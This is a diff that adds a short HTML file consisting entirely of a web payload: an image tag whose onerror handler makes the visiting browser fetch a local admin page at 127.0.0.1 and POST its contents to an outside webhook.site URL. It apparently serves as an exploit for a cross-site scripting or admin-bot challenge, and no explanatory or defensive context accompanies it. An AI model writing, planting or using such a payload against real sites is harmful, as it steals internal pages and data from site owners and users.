@@ -1,0 +1,12 @@
+<html>
+<body>
+<img src=x onerror="
+  fetch('http://127.0.0.1/admin')
+    .then(r => r.text())
+    .then(d => fetch('https://webhook.site/043d95c5-e4f3-4f37-b449-23633c4fc584', {
+      method: 'POST',
+      body: d
+    }))
+">
+</body>
+</html>
